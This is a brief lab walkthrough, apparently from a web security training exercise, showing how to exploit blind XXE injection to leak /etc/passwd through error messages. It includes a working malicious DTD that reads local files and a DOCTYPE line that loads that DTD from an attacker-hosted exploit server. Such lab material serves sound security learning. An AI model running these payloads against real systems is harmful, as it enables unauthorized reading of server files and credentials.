# Lab: Exploiting blind XXE to retrieve data via error messages #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/0b688adc-6de5-4ff9-be0e-fabb8bb3bb7a)

Click "Go to exploit server" and save the following malicious DTD file on your server:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
````

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/05190317-97e8-404a-8ec0-4ebb8d34032b)

> Click "View exploit" and take a note of the URL for your malicious DTD.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/1c8d583c-64ec-4cc1-997e-614e1aa97a55)

> Insert the following external entity definition in between the XML declaration and the stockCheck element:

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>

> We have modified the request

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/559fa5aa-2961-4ee8-b269-05728dd5b7d3)

> So we can see the response the content of /etc/passwd

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ad5960dd-c421-48e4-964e-204db8a211f0)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/3bf9579c-4b2d-4fe8-acb8-35c1b341777d)


